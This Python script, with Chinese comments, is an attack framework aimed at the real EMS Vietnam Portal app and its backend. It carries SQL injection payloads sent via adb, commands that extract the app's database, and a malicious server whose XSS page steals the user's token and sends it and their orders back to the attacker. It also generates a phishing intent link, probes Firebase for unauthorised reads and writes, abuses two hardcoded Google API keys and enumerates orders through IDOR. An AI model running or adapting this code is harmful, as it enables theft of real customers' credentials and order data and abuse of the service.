#!/usr/bin/env python3
"""
EMS Vietnam Portal - 高级渗透测试框架
包含所有已发现漏洞的完整利用代码
"""

import requests
import json
import time
import subprocess
import threading
import http.server
import socketserver
from urllib.parse import quote
import sqlite3
import os
from typing import Optional, Dict, List

class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    PURPLE = '\033[0;35m'
    CYAN = '\033[0;36m'
    NC = '\033[0m'

class EMSAdvancedExploit:
    def __init__(self):
        self.base_url = "http://ws.ems.com.vn"
        self.token = None
        self.session = requests.Session()
        self.firebase_url = "https://ems-khl-app-notify.firebaseio.com"
        
    def banner(self):
        print(f"""{Colors.RED}
╔═══════════════════════════════════════════════════╗
║   EMS Vietnam Portal - Advanced Exploit Framework  ║
║   Target: com.emsportal                           ║
║   Vulns: 8 (5 HIGH, 3 MEDIUM)                    ║
╚═══════════════════════════════════════════════════╝
{Colors.NC}""")

    # ============= 漏洞1: SQL注入利用 =============
    def exploit_sql_injection_local(self):
        """
        利用本地数据库SQL注入读取缓存数据
        需要root权限或备份权限
        """
        print(f"\n{Colors.YELLOW}[*] 漏洞1: 本地SQL注入利用{Colors.NC}")
        
        # SQL注入Payload
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1,response,time_updated FROM caching--",
            "' UNION SELECT response,response,response FROM caching WHERE 1=1--"
        ]
        
        for payload in payloads:
            print(f"{Colors.CYAN}[*] 测试Payload: {payload}{Colors.NC}")
            
            # 通过Intent注入
            cmd = f"""
            adb shell am start -n com.emsportal/.MainActivity \\
              --es CACHE_KEY "{payload}"
            """
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if "Error" not in result.stderr:
                print(f"{Colors.GREEN}[+] Payload可能成功{Colors.NC}")
            
            time.sleep(1)
    
    def extract_local_db(self):
        """提取本地数据库"""
        print(f"\n{Colors.YELLOW}[*] 提取本地SQLite数据库{Colors.NC}")
        
        # 方法1: Root设备
        cmd_root = """
        adb root && \
        adb pull /data/data/com.emsportal/databases/db.sqlite ./ems_db.sqlite
        """
        
        print(f"{Colors.CYAN}[*] 尝试方法1: Root提取{Colors.NC}")
        result = subprocess.run(cmd_root, shell=True, capture_output=True)
        
        if os.path.exists("ems_db.sqlite"):
            print(f"{Colors.GREEN}[+] 数据库提取成功！{Colors.NC}")
            self.analyze_sqlite_db("ems_db.sqlite")
            return True
        
        # 方法2: 备份提取
        print(f"{Colors.CYAN}[*] 尝试方法2: 备份提取{Colors.NC}")
        cmd_backup = """
        adb backup -f ems.ab com.emsportal && \
        dd if=ems.ab bs=24 skip=1 | openssl zlib -d > ems.tar 2>/dev/null && \
        tar xvf ems.tar apps/com.emsportal/db/db.sqlite
        """
        
        result = subprocess.run(cmd_backup, shell=True, capture_output=True)
        
        if os.path.exists("apps/com.emsportal/db/db.sqlite"):
            print(f"{Colors.GREEN}[+] 备份提取成功！{Colors.NC}")
            self.analyze_sqlite_db("apps/com.emsportal/db/db.sqlite")
            return True
        
        print(f"{Colors.RED}[-] 数据库提取失败{Colors.NC}")
        return False
    
    def analyze_sqlite_db(self, db_path: str):
        """分析SQLite数据库"""
        print(f"\n{Colors.YELLOW}[*] 分析数据库: {db_path}{Colors.NC}")
        
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # 获取所有表
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = cursor.fetchall()
            
            print(f"{Colors.GREEN}[+] 发现 {len(tables)} 个表:{Colors.NC}")
            for table in tables:
                print(f"  - {table[0]}")
            
            # 分析caching表
            if any('caching' in t[0] for t in tables):
                cursor.execute("SELECT * FROM caching LIMIT 10")
                rows = cursor.fetchall()
                
                print(f"\n{Colors.GREEN}[+] 缓存数据样本:{Colors.NC}")
                for row in rows:
                    print(f"  Request: {row[0]}")
                    print(f"  Response: {row[1][:100]}...")
                    print("  ---")
            
            conn.close()
            
        except Exception as e:
            print(f"{Colors.RED}[-] 分析失败: {str(e)}{Colors.NC}")

    # ============= 漏洞2: WebView XSS利用 =============
    def exploit_webview_xss(self, malicious_url: Optional[str] = None):
        """
        利用WebView URL注入进行XSS攻击
        """
        print(f"\n{Colors.YELLOW}[*] 漏洞2: WebView XSS利用{Colors.NC}")
        
        if not malicious_url:
            # 启动恶意服务器
            print(f"{Colors.CYAN}[*] 启动恶意服务器...{Colors.NC}")
            server_thread = threading.Thread(target=self.start_malicious_server)
            server_thread.daemon = True
            server_thread.start()
            time.sleep(2)
            
            malicious_url = "http://YOUR_IP:8000/evil.html"
        
        # 方法1: ADB触发
        print(f"{Colors.CYAN}[*] 方法1: 通过ADB触发{Colors.NC}")
        cmd = f"""
        adb shell am start -n com.emsportal/.grab.activity.FollowDriverOnMapActivity \\
          --es KEY_URL_FOLLOW_DRIVER_ON_MAP "{malicious_url}"
        """
        
        print(f"{Colors.BLUE}执行命令:{Colors.NC}")
        print(cmd)
        
        result = subprocess.run(cmd, shell=True, capture_output=True)
        
        if result.returncode == 0:
            print(f"{Colors.GREEN}[+] WebView已打开恶意URL{Colors.NC}")
            print(f"{Colors.YELLOW}[!] 等待受害者Token...{Colors.NC}")
        else:
            print(f"{Colors.RED}[-] 触发失败: {result.stderr.decode()}{Colors.NC}")
        
        # 方法2: 构造Intent URL (用于钓鱼)
        print(f"\n{Colors.CYAN}[*] 方法2: 生成钓鱼链接{Colors.NC}")
        intent_url = self.generate_intent_url(malicious_url)
        print(f"{Colors.GREEN}[+] 钓鱼链接:{Colors.NC}")
        print(f"    {intent_url}")
    
    def start_malicious_server(self):
        """启动恶意HTTP服务器"""
        
        class MaliciousHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/evil.html':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    payload = '''
                    <!DOCTYPE html>
                    <html>
                    <head><title>Loading...</title></head>
                    <body>
                    <h1>正在加载配送信息...</h1>
                    <script>
                    // 尝试读取SharedPreferences
                    function stealToken() {
                        fetch('file:///data/data/com.emsportal/shared_prefs/com.emsportal_preferences.xml')
                          .then(r => r.text())
                          .then(data => {
                            // 提取Token
                            let tokenMatch = data.match(/<string name="PREF_TOKEN_USER">([^<]+)<\\/string>/);
                            if (tokenMatch) {
                              let token = tokenMatch[1];
                              console.log("Token found: " + token);
                              
                              // 发送到攻击者服务器
                              fetch('/steal?token=' + encodeURIComponent(token))
                                .then(() => {
                                  // 使用Token调用API
                                  fetch('http://ws.ems.com.vn/api/v1/orders/list', {
                                    headers: {'Authorization': 'Bearer ' + token}
                                  }).then(r => r.json())
                                    .then(orders => {
                                      fetch('/orders', {
                                        method: 'POST',
                                        body: JSON.stringify(orders)
                                      });
                                    });
                                });
                            }
                          })
                          .catch(e => console.log("Error: " + e));
                    }
                    
                    // 延迟执行
                    setTimeout(stealToken, 1000);
                    </script>
                    </body>
                    </html>
                    '''
                    self.wfile.write(payload.encode())
                
                elif self.path.startswith('/steal'):
                    # 接收窃取的Token
                    query = self.path.split('?')[1] if '?' in self.path else ''
                    print(f"\n{Colors.GREEN}[!!!] 窃取成功！{Colors.NC}")
                    print(f"{Colors.GREEN}[+] Query: {query}{Colors.NC}")
                    
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'OK')
                
                elif self.path == '/orders':
                    # 接收窃取的订单数据
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    
                    print(f"\n{Colors.GREEN}[!!!] 订单数据窃取成功！{Colors.NC}")
                    with open('stolen_orders.json', 'wb') as f:
                        f.write(post_data)
                    
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'OK')
                
                else:
                    super().do_GET()
        
        PORT = 8000
        with socketserver.TCPServer(("", PORT), MaliciousHandler) as httpd:
            print(f"{Colors.GREEN}[+] 恶意服务器运行在端口 {PORT}{Colors.NC}")
            httpd.serve_forever()
    
    def generate_intent_url(self, url: str) -> str:
        """生成Intent URL用于钓鱼"""
        intent_url = (
            "intent://grab.activity.FollowDriverOnMapActivity#Intent;"
            f"S.KEY_URL_FOLLOW_DRIVER_ON_MAP={quote(url)};"
            "component=com.emsportal/.grab.activity.FollowDriverOnMapActivity;"
            "end"
        )
        return intent_url

    # ============= 漏洞3: Intent劫持 =============
    def exploit_intent_hijacking(self):
        """利用导出组件进行Intent劫持"""
        print(f"\n{Colors.YELLOW}[*] 漏洞3: Intent组件劫持{Colors.NC}")
        
        # 测试MainActivity
        print(f"{Colors.CYAN}[*] 测试MainActivity...{Colors.NC}")
        
        payloads = {
            "TOKEN": "malicious_token",
            "USER_ID": "999999",
            "ORDER_ID": "EMS000000001VN"
        }
        
        for key, value in payloads.items():
            cmd = f"""
            adb shell am start -n com.emsportal/.MainActivity \\
              --es {key} "{value}"
            """
            print(f"  [*] 注入: {key}={value}")
            subprocess.run(cmd, shell=True, capture_output=True)
            time.sleep(0.5)
        
        print(f"{Colors.GREEN}[+] Intent劫持测试完成{Colors.NC}")

    # ============= 漏洞4: Firebase未授权 =============
    def exploit_firebase_unauth(self):
        """测试Firebase实时数据库未授权访问"""
        print(f"\n{Colors.YELLOW}[*] 漏洞4: Firebase未授权访问{Colors.NC}")
        
        endpoints = [
            "/.json",
            "/.json?shallow=true",
            "/orders/.json",
            "/users/.json",
            "/notifications/.json",
            "/merchants/.json",
            "/drivers/.json"
        ]
        
        results = {}
        for ep in endpoints:
            url = f"{self.firebase_url}{ep}"
            print(f"{Colors.CYAN}[*] 测试: {ep}{Colors.NC}")
            
            try:
                resp = requests.get(url, timeout=10)
                
                if resp.status_code == 200:
                    data = resp.json()
                    if data and data != "null":
                        print(f"{Colors.GREEN}[+] 发现数据！{Colors.NC}")
                        results[ep] = data
                        
                        # 保存数据
                        filename = f"firebase_{ep.replace('/', '_')}.json"
                        with open(filename, 'w') as f:
                            json.dump(data, f, indent=2)
                        print(f"{Colors.GREEN}    保存到: {filename}{Colors.NC}")
                    else:
                        print(f"{Colors.YELLOW}    空数据{Colors.NC}")
                else:
                    print(f"{Colors.RED}    拒绝访问: {resp.status_code}{Colors.NC}")
                    
            except Exception as e:
                print(f"{Colors.RED}    错误: {str(e)}{Colors.NC}")
        
        # 尝试写入
        print(f"\n{Colors.CYAN}[*] 测试写入权限...{Colors.NC}")
        try:
            test_data = {"hack": "test", "timestamp": int(time.time())}
            resp = requests.put(
                f"{self.firebase_url}/test.json",
                json=test_data,
                timeout=10
            )
            
            if resp.status_code == 200:
                print(f"{Colors.RED}[!!!] 写入成功！数据库完全开放！{Colors.NC}")
            else:
                print(f"{Colors.GREEN}[+] 写入被拒绝 (仅读取漏洞){Colors.NC}")
        except Exception as e:
            print(f"{Colors.YELLOW}[*] 写入测试失败: {str(e)}{Colors.NC}")
        
        return results

    # ============= 漏洞6: Google API Key滥用 =============
    def exploit_google_api_keys(self):
        """滥用泄露的Google API Keys"""
        print(f"\n{Colors.YELLOW}[*] 漏洞6: Google API Key滥用{Colors.NC}")
        
        api_keys = [
            "AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY",
            "AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc"
        ]
        
        for key in api_keys:
            print(f"\n{Colors.CYAN}[*] 测试Key: {key[:25]}...{Colors.NC}")
            
            # 测试1: 地点搜索
            print(f"  [*] 测试地点搜索...")
            resp = requests.get(
                "https://maps.googleapis.com/maps/api/place/nearbysearch/json",
                params={
                    "location": "10.762622,106.660172",
                    "radius": 5000,
                    "key": key
                },
                timeout=10
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if "results" in data:
                    print(f"{Colors.GREEN}      [+] API有效！返回 {len(data['results'])} 个结果{Colors.NC}")
                elif "error_message" in data:
                    print(f"{Colors.YELLOW}      [-] API受限: {data['error_message']}{Colors.NC}")
            
            # 测试2: 地理编码
            print(f"  [*] 测试地理编码...")
            resp = requests.get(
                "https://maps.googleapis.com/maps/api/geocode/json",
                params={
                    "address": "Hanoi, Vietnam",
                    "key": key
                },
                timeout=10
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "OK":
                    print(f"{Colors.GREEN}      [+] 地理编码成功{Colors.NC}")
            
            # 测试3: 路线规划 (消耗配额)
            print(f"  [*] 测试路线规划...")
            resp = requests.get(
                "https://maps.googleapis.com/maps/api/directions/json",
                params={
                    "origin": "Hanoi",
                    "destination": "Ho Chi Minh City",
                    "key": key
                },
                timeout=10
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "OK":
                    print(f"{Colors.GREEN}      [+] 路线规划成功 (高配额消耗){Colors.NC}")

    # ============= 漏洞8: IDOR测试 =============
    def exploit_idor_with_token(self, token: str, start_id: int = 100000000, count: int = 100):
        """利用IDOR遍历订单"""
        print(f"\n{Colors.YELLOW}[*] 漏洞8: IDOR订单遍历{Colors.NC}")
        print(f"{Colors.CYAN}[*] 范围: EMS{start_id}VN ~ EMS{start_id+count}VN{Colors.NC}")
        
        self.token = token
        found = []
        
        for i in range(start_id, start_id + count):
            order_id = f"EMS{i}VN"
            
            try:
                resp = self.session.get(
                    f"{self.base_url}/api/v1/orders/tracking/{order_id}",
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=5
                )
                
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("success"):
                        print(f"{Colors.GREEN}[+] 找到: {order_id}{Colors.NC}")
                        found.append({
                            "order_id": order_id,
                            "data": data.get("data", {})
                        })
                        
            except Exception:
                pass
            
            time.sleep(0.3)
        
        # 保存结果
        if found:
            with open('idor_orders.json', 'w') as f:
                json.dump(found, f, indent=2)
            print(f"\n{Colors.GREEN}[+] 发现 {len(found)} 个订单，已保存到 idor_orders.json{Colors.NC}")
        else:
            print(f"\n{Colors.YELLOW}[-] 未发现可访问订单{Colors.NC}")
        
        return found

    # ============= 完整攻击链 =============
    def full_attack_chain(self):
        """执行完整攻击链"""
        print(f"\n{Colors.RED}{'='*60}{Colors.NC}")
        print(f"{Colors.RED}[!!!] 执行完整攻击链{Colors.NC}")
        print(f"{Colors.RED}{'='*60}{Colors.NC}")
        
        # 1. Google API Key测试
        self.exploit_google_api_keys()
        
        # 2. Firebase测试
        firebase_data = self.exploit_firebase_unauth()
        
        # 3. WebView XSS (需要用户交互)
        print(f"\n{Colors.YELLOW}[*] 跳过WebView XSS (需要用户交互){Colors.NC}")
        
        # 4. 本地数据库提取
        self.extract_local_db()
        
        # 5. Intent劫持
        self.exploit_intent_hijacking()
        
        # 6. SQL注入
        self.exploit_sql_injection_local()
        
        print(f"\n{Colors.GREEN}{'='*60}{Colors.NC}")
        print(f"{Colors.GREEN}[+] 攻击链执行完成{Colors.NC}")
        print(f"{Colors.GREEN}{'='*60}{Colors.NC}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='EMS Portal高级渗透测试')
    parser.add_argument('--exploit', choices=[
        'sql', 'webview', 'intent', 'firebase', 'google', 'idor', 'db', 'full'
    ], default='full', help='选择利用模块')
    parser.add_argument('-t', '--token', help='Bearer Token (用于IDOR)')
    parser.add_argument('--url', help='恶意URL (用于WebView)')
    parser.add_argument('--start-id', type=int, default=100000000, help='IDOR起始ID')
    parser.add_argument('--count', type=int, default=100, help='IDOR遍历数量')
    
    args = parser.parse_args()
    
    exploit = EMSAdvancedExploit()
    exploit.banner()
    
    if args.exploit == 'sql':
        exploit.exploit_sql_injection_local()
    elif args.exploit == 'webview':
        exploit.exploit_webview_xss(args.url)
    elif args.exploit == 'intent':
        exploit.exploit_intent_hijacking()
    elif args.exploit == 'firebase':
        exploit.exploit_firebase_unauth()
    elif args.exploit == 'google':
        exploit.exploit_google_api_keys()
    elif args.exploit == 'idor':
        if not args.token:
            print(f"{Colors.RED}[-] IDOR需要提供Token: --token YOUR_TOKEN{Colors.NC}")
        else:
            exploit.exploit_idor_with_token(args.token, args.start_id, args.count)
    elif args.exploit == 'db':
        exploit.extract_local_db()
    elif args.exploit == 'full':
        exploit.full_attack_chain()

if __name__ == "__main__":
    main()
